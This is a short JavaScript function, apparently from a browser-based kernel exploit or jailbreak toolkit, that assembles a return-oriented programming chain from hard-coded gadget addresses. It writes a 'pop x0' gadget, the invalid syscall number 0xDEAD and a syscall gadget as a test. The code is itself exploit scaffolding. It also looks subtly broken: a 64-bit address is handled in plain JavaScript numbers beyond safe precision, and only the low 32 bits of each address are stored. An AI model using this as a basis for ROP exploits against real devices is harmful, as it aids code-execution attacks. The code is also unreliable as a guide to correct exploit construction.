function setupROP() {
  ropChain = new Uint32Array(0x400);
  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;
  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = 0xDEAD; // Invalid syscall

  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;

  debug_log("ROP chain (invalid syscall test) initialized.");
  return ropChain;
}
